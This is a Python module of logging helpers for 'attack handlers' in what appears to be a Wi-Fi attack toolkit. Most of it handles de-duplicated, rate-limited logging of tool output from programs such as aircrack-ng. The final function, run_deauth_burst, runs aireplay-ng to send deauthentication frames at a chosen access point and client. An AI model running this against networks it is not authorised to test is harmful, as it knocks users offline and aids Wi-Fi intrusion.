"""Shared logging utilities for attack handlers."""
from __future__ import annotations

import re
import subprocess
import time
from datetime import datetime, timezone
from pathlib import Path

_ANSI_RE = re.compile(r"\x1b\[[0-9;]*[a-zA-Z]|\r|\x00")

MIN_LINE_INTERVAL = 2.0


def strip_ansi(s: str) -> str:
    return _ANSI_RE.sub("", s).strip()


def log(log_path: Path, msg: str) -> None:
    ts = datetime.now(timezone.utc).strftime("%H:%M:%S")
    with open(log_path, "a", encoding="utf-8") as f:
        f.write(f"[{ts}] {msg}\n")


class ToolOutputLogger:
    """Rate-limited deduplicating logger for tool stdout.
    Logs every new unique line, rate-limits identical repeats.
    Optional noise_filter: a compiled regex - matching lines update last_status but are NOT written to the log."""

    def __init__(self, log_path: Path, prefix: str = "", noise_filter: re.Pattern | None = None):
        self.log_path = log_path
        self.prefix = prefix
        self.noise_filter = noise_filter
        self._prev_line = ""
        self._last_time = 0.0
        self.last_status = ""

    def feed(self, raw_line: str, important: bool = False) -> None:
        line = strip_ansi(raw_line.strip())
        if not line:
            return
        self.last_status = line

        if not important and self.noise_filter and self.noise_filter.search(line):
            return

        now = time.time()
        if line != self._prev_line or important:
            log(self.log_path, f"  {self.prefix}{line[:250]}")
            self._prev_line = line
            self._last_time = now
        elif now - self._last_time >= MIN_LINE_INTERVAL:
            log(self.log_path, f"  {self.prefix}{line[:250]}")
            self._last_time = now


def drain_stdout(proc, logger: ToolOutputLogger, important_patterns: list[re.Pattern] | None = None) -> None:
    """Non-blocking read of all available lines from proc.stdout."""
    import select as _sel
    if not proc.stdout:
        return
    while True:
        ready, _, _ = _sel.select([proc.stdout], [], [], 0)
        if not ready:
            break
        raw = proc.stdout.readline()
        if not raw:
            break
        important = False
        if important_patterns:
            clean = strip_ansi(raw)
            important = any(p.search(clean) for p in important_patterns)
        logger.feed(raw, important=important)


def drain_stdout_cr(
    proc,
    logger: ToolOutputLogger,
    important_patterns: list[re.Pattern] | None = None,
) -> None:
    """Non-blocking read that handles \\r-delimited progress (e.g. aircrack-ng).

    Many tools overwrite the current line with \\r instead of \\n.
    We read raw bytes, split on both \\r and \\n, and feed each fragment.
    """
    import select as _sel
    if not proc.stdout:
        return
    fd = proc.stdout.fileno()
    import os as _os
    while True:
        ready, _, _ = _sel.select([fd], [], [], 0)
        if not ready:
            break
        chunk = _os.read(fd, 8192)
        if not chunk:
            break
        text = chunk.decode("utf-8", errors="replace")
        for fragment in re.split(r"[\r\n]+", text):
            fragment = fragment.strip()
            if not fragment:
                continue
            important = False
            if important_patterns:
                clean = strip_ansi(fragment)
                important = any(p.search(clean) for p in important_patterns)
            logger.feed(fragment, important=important)


def run_deauth_burst(
    log_path: Path,
    interface: str,
    bssid: str,
    deauth_count: int,
    client_mac: str | None,
) -> int:
    """Send targeted deauth frames (-a AP -c STA) and return count attempted.

    Only targeted deauth is used to avoid disrupting non-target clients on the BSS.
    If client_mac is not set, no deauth is sent and a warning is logged.
    """
    if not client_mac:
        log(log_path, "  deauth skipped - no target client selected")
        return 0

    timeout_sec = max(45, min(360, 20 + deauth_count * 3))
    cmd = ["aireplay-ng", "-0", str(deauth_count), "-a", bssid, "-c", client_mac, interface]
    log(log_path, f"  deauth -> {client_mac} x{deauth_count}")
    sent = 0
    try:
        r = subprocess.run(
            cmd,
            timeout=timeout_sec,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
        )
        output = (r.stdout or "").strip()
        if output:
            for line in output.splitlines()[-5:]:
                clean = strip_ansi(line)
                if clean:
                    log(log_path, f"  aireplay> {clean[:220]}")
        if r.returncode != 0:
            log(log_path, f"  aireplay-ng exit code {r.returncode}")
        else:
            sent = deauth_count
    except subprocess.TimeoutExpired:
        log(log_path, f"  aireplay> timed out ({timeout_sec}s) - burst incomplete")
    return sent
